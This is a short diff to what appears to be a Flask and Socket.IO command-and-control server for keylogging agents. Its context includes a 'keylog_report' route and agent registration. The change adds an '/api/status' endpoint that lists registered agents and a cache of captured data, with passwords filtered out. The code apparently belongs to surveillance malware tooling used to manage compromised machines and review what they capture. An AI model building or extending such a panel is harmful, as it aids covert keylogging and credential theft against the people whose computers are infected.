@@ -404,6 +404,14 @@ def keylog_report(agent_name):
     return Response(html, mimetype="text/html")
 
 
+@app.route("/api/status")
+def api_status():
+    return jsonify({
+        "agents": list(agents.values()),
+        "fastcap_cache": {k: {ek: ev for ek, ev in v.items() if ek != "password"} for k, v in _fastcap_cache.items()},
+    })
+
+
 # ── Agent registration ────────────────────────────────────────────────────────
 
 @socketio.on("register")
